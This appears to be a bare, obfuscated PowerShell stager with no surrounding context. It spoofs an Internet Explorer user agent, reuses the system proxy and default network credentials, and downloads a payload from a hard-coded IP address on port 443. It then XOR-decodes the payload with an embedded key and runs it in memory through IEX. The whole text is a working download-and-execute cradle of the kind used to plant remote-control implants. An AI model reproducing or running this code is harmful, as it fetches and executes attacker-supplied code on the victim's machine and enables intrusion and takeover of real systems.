[SySTeM.NeT.SErviCePOinTMANAGER]::ExPect100COnTiNue = 0;$Wc=NeW-OBjeCt SyStem.NET.WeBCLienT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeadERS.Add('User-Agent',$u);$wC.ProXy = [SySteM.NET.WEbReQUest]::DeFaULTWebPrOXy;$Wc.PRoXY.CREdEntialS = [SYstEm.NET.CReDENtIALCACHE]::DefaulTNeTWORKCrEDenTIALs;$K='0]Y$4_D9@^T#US2pOdx73A`mrk1L|+a';$I=0;[ChAr[]]$b=([CHAr[]]($wc.DOWnloaDStRinG("http://84.200.84.185:443/index.asp")))|%{$_-BXOR$k[$i++%$K.LengtH]};IEX ($b-jOiN'')